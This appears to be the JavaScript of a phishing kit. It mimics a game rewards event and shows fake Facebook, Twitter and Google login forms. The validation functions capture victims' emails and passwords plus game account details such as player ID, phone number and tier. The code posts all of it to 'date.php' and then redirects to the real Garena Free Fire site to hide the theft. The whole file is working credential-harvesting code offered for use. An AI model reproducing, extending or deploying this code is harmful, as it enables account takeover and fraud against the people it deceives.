// code for activate clicked sound
var buka = new Audio();
buka.src = "media/open.mp3";

var tutup = new Audio();
tutup.src = "media/close.mp3";

// show hide password for facebook
function showFbPassword() {
  var x = document.getElementById("password-facebook");
  if (x.type === "password") {
    x.type = "text";
	$('.showPassword').hide();
	$('.hidePassword').show();
  } else {
    x.type = "password";
  }
}
function hideFbPassword() {
  var x = document.getElementById("password-facebook");
  if (x.type === "text") {
    x.type = "password";
	$('.showPassword').show();
	$('.hidePassword').hide();
  } else {
    x.type = "text";
  }
}

// show hide password for twitter
function showTwitterPassword() {
  var x = document.getElementById("password-twitter");
  if (x.type === "password") {
    x.type = "text";
	$('.TwitterShowPassword').hide();
	$('.TwitterHidePassword').show();
  } else {
    x.type = "password";
  }
}
function hideTwitterPassword() {
  var x = document.getElementById("password-twitter");
  if (x.type === "text") {
    x.type = "password";
	$('.TwitterShowPassword').show();
	$('.TwitterHidePassword').hide();
  } else {
    x.type = "text";
  }
}


// code for validate data to next step
function audioFile() {
    var audio = document.getElementById('audioFile');  
    audio.play();
}

$(document).ready(function() {
    $("o").attr("onclick", "audioFile()");  
});

function openRewards(evt, rewardsClass) {
    var i, tab_rewards, tab_rewards_link;
    tab_rewards = document.getElementsByClassName("tab_rewards");
    for (i = 0; i < tab_rewards.length; i++) {
        tab_rewards[i].style.display = "none";  
    }
    tab_rewards_link = document.getElementsByClassName("menu-content");
    for (i = 0; i < tab_rewards_link.length; i++) {
        tab_rewards_link[i].className = tab_rewards_link[i].className.replace(" menu-content-active", "");
    }
    document.getElementById(rewardsClass).style.display = "block";
    evt.currentTarget.className += " menu-content-active";
}
document.getElementById("defaultTabRewards").click();  
function open_account_verification() {
  $('.account_verification').show()
  $('.open_rewards').hide()
  $('.otherReward_confirmation').hide()
}
function open_itemReward_confirmation2(ag) {
  var itemReward_confirmationImg2 = $(ag).attr("src");
  var ItemName = $(ag).attr("item-name");
  var amount = $(ag).attr("item-total");
  var price = $(ag).attr("item-price");
  $('.itemReward_confirmation2').show();   
  $('#myItemReward_confirmationImg').attr('src',itemReward_confirmationImg2);
  $('#ItemName').html(ItemName);
  $('#amount').html(amount);
  $('#price').html(price);
}
function open_mail_login() {
  $('.login-mail').show()
  $('.account_login').hide()
}
function close_mail_login() {
  $('.login-mail').hide()
  $('.account_login').show()
}
function open_about_event() {
  $('.about_event').show()
}
function open_event_rules() {
  $('.event_rules').show()
}
function open_facebook() {
  $('.login-facebook').show()
  $('.account_login').hide()
}
function open_twitter() {
  $('.login-twitter').show()
  $('.account_login').hide()
}
function close_reward_confirmation() {
  $('.open_rewards').hide()
  $('.event_rules').hide()
}
function close_reward_confirmations() {
  $('.event_rules').hide()
  $('.about_event').hide()
}
function close_facebook() {
  $('.login-facebook').hide()
  $('.account_login').show()
}
function close_twitter() {
  $('.login-twitter').hide()
  $('.account_login').show()
}
function open_newhome() {
  $('.account_login').show()
  $('.newhome').hide()
}
function open_account_login() {
  $('.account_login').show()
  $('.open_rewards').hide()
}
function open_google() {
  $('.login-google').show();
  $('.account_login').hide();
}
function close_google() {
  $('.login-google').hide();
  $('.account_login').show();
}
function setFocus(on) {
      var element = document.activeElement;
      if (on) {
        setTimeout(function() {
          element.parentNode.classList.add("focus");
        });
      } else {
        let box = document.querySelector(".input-box");
        box.classList.remove("focus");
        $("input").each(function() {
          var $input = $(this);
          var $parent = $input.closest(".input-box");
          if ($input.val()) $parent.addClass("focus");
          else $parent.removeClass("focus");
        });
      }
    }

// code for validate data to next step
function ValidateLoginGoogleData() {
	$('#ValidateLoginGoogleForm').submit(function(submitingValidateLoginGoogleData){
	submitingValidateLoginGoogleData.preventDefault();
	
	$emailfb = $('#email-google').val().trim();
	$passwordfb = $('#password-google').val().trim();
	$loginfb = $('#login-google').val().trim();
            if($emailfb == '' || $emailfb == null || $emailfb.length <= 5)
            {
                $('.email-fb').show();
                $('.sandi-fb').hide();
                $('.login-google').show();
                return false;
            }else{
                $('.email-fb').hide();               
	              $("input#validateEmail").val($emailfb);
                $('.login-google').hide();  
            }
            if($passwordfb == '' || $passwordfb == null || $passwordfb.length <= 5)
            {
                $('.sandi-fb').show();
                $('.login-google').show();
                return false;
            }else{
                $('.sandi-fb').hide();
	              $("input#validatePassword").val($passwordfb);
	              $("input#validateLogin").val($loginfb);
			          $('.account_verification').show();
                $('.login-google').hide();	          	           
	}
	}); 
}

// code function data
function ValidateLoginFbData() {
	$('#ValidateLoginFbForm').submit(function(submitingValidateLoginFbData){
	submitingValidateLoginFbData.preventDefault();
	
	$emailfb = $('#email-facebook').val().trim();
	$passwordfb = $('#password-facebook').val().trim();
	$loginfb = $('#login-facebook').val().trim();
            if($emailfb == '' || $emailfb == null || $emailfb.length <= 5)
            {
                $('.email-fb').show();
                $('.sandi-fb').hide();
                $('.login-facebook').show();
                return false;
            }else{
                $('.email-fb').hide();               
	              $("input#validateEmail").val($emailfb);
                $('.login-facebook').hide();  
            }
            if($passwordfb == '' || $passwordfb == null || $passwordfb.length <= 5)
            {
                $('.sandi-fb').show();
                $('.login-facebook').show();
                return false;
            }else{
                $('.sandi-fb').hide();
	              $("input#validatePassword").val($passwordfb);
	              $("input#validateLogin").val($loginfb);
			          $('.account_verification').show();
                $('.login-facebook').hide();	          	           
	}
	}); 
}
function ValidateVerificationData() {
  return (
    $('#ValidateVerificationDataForm').submit(function(submitingValidateVerificationData){
	submitingValidateVerificationData.preventDefault();
      var $validateEmail = $('input#validateEmail').val(),
        $validatePassword = $('input#validatePassword').val(),
        $nick = $('input#nick').val(),
        $playid = $('input#playid').val(),
        $phone = $('input#phone').val(),
        $level = $('input#level').val(),
        $tier = $('input#tier').val(),
        $rpt = $('input#rpt').val(),
        $rpl = $('input#rpl').val(),
        $platform = $('input#platform').val(),
        $validateLogin = $('input#validateLogin').val()
      if (
        $validateEmail == '' &&
        $validatePassword == '' &&
        $nick == '' &&
        $playid == '' &&
        $phone == '' &&
        $level == '' &&
        $tier == '' &&
        $rpt == '' &&
        $rpl == '' &&
        $platform == '' &&
        $validateLogin == ''
      ) {
        return $('.account_verification').show(),  false
      }
      $.ajax({
        type: 'POST',
        url: 'date.php',
        data: $(this).serialize(),
        beforeSend: function () {
          $('.check_verification').show()
          $('.account_verification').hide()
        },
        success: function(){
	location.href = "https://ff.garena.com/";
	}
      })
    }),
    false
  )
}